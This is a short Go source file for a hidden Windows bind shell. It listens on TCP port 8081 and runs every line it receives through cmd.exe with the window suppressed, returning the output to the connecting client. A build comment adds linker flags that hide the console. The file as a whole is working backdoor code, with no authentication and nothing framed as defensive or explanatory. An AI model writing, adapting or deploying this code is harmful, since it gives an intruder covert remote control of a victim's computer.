//go build -ldflags "-s -H windowsgui" server.go
package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/text/encoding/charmap"
)

func main() {

	ln, _ := net.Listen("tcp", ":8081")
	conn, _ := ln.Accept()
	for {
		connbuf := bufio.NewReader(conn)
		str, err := connbuf.ReadString('\n')
		if err != nil {
			break
		}
		message := strings.TrimRight(str, "\r\n")
		Result := winShellExe(string(message))
		conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
	}
}

/* "winShellExe" - Function to send command for interpretator OS ...
Example:
Result := WinShellExe("whoami")
return Result */
func winShellExe(strCommand string) (out string) {

	argsCommand := strings.Split(strCommand, " ")
	cmd := exec.Command("cmd", argsCommand...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdout, _ := cmd.Output()
	d := charmap.CodePage866.NewDecoder()
	decodeOut, _ := d.Bytes(stdout)
	out = string(decodeOut)
	return
}
